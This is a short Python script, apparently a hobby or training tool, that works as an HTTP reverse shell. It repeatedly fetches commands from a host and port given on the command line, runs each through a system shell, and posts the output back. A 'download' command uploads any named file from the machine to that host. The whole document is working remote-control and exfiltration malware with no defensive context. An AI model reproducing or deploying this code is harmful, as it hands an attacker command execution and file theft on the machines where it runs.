#this script creates a reverse connection
#to a given host and port using HTTP.
#Receives GET requests which include 
#the command to be run, executes it
#and sends output via POST.

import sys
import subprocess
import requests
import os 

def check_args():
	if len(sys.argv)==3:
		global ip 
		global port 
		ip = str(sys.argv[1])
		port = int(sys.argv[2])
	else:
		print(f'Usage: python3 {sys.argv[0]} <IP> <port>')

def connect():
	while True:
		req = requests.get(f'http://{ip}:{port}')
		command = req.text

		if command == 'exit':
			break
		elif command.startswith('download '):
			_,path = command.split(' ')
			if os.path.exists(path):
				files = {'file': open(path,'rb')}

				resp = requests.post(f'http://{ip}:{port}/download_file', files=files)
				resp = requests.post(f'http://{ip}:{port}',data='[+]Download complete'.encode())

			else:
				resp = requests.post(f'http://{ip}:{port}',data='[-]File not found...'.encode())
		else:
			exec_command = subprocess.Popen(command,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
			resp = requests.post(f'http://{ip}:{port}',data=exec_command.stdout.read())
			resp = requests.post(f'http://{ip}:{port}',data=exec_command.stderr.read())

if __name__=='__main__':
	check_args()
	connect()